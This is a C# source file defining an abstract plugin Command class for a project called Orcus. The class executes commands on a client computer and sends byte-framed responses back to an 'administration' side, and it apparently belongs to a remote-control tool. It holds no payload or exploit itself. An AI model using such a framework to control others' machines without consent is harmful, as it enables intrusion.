using System;
using Orcus.Shared.Communication;

namespace Orcus.Plugins
{
    /// <summary>
    ///     A command registered by the client
    /// </summary>
    public abstract class Command : IDisposable
    {
        private uint? _identifier;

        /// <summary>
        ///     The command ID
        /// </summary>
        public uint Identifier => (_identifier ?? (_identifier = GetId())).Value;

        /// <summary>
        ///     Called when the administration is disconnected
        /// </summary>
        public virtual void Dispose()
        {
        }

        /// <summary>
        ///     Execute the function. This method is only executed on the computer of the client
        /// </summary>
        /// <param name="parameter">The parameter without token</param>
        /// <param name="connectionInfo">Some information to send some data</param>
        public abstract void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo);

        /// <summary>
        ///     Response a single byte
        /// </summary>
        protected void ResponseByte(byte b, IConnectionInfo connectionInfo)
        {
            var package = new byte[5];
            Array.Copy(BitConverter.GetBytes(Identifier), package, 4);
            package[4] = b;
            connectionInfo.Response(package, ResponseType.CommandResponse);
        }

        /// <summary>
        ///     Response a byte array
        /// </summary>
        protected void ResponseBytes(byte[] b, IConnectionInfo connectionInfo)
        {
            connectionInfo.CommandResponse(this, b);
        }

        /// <summary>
        ///     Response a byte array with a token byte at the top of the array
        /// </summary>
        protected void ResponseBytes(byte command, byte[] b, IConnectionInfo connectionInfo)
        {
            var package = new byte[4 + 1 + b.Length];
            Array.Copy(BitConverter.GetBytes(Identifier), package, 4);
            package[4] = command;
            Array.Copy(b, 0, package, 5, b.Length);
            connectionInfo.Response(package, ResponseType.CommandResponse);
        }

        /// <summary>
        ///     Internally get the id of the command
        /// </summary>
        /// <returns>The id of the command. Please generate the id using the plugin id generator</returns>
        protected abstract uint GetId();
    }
}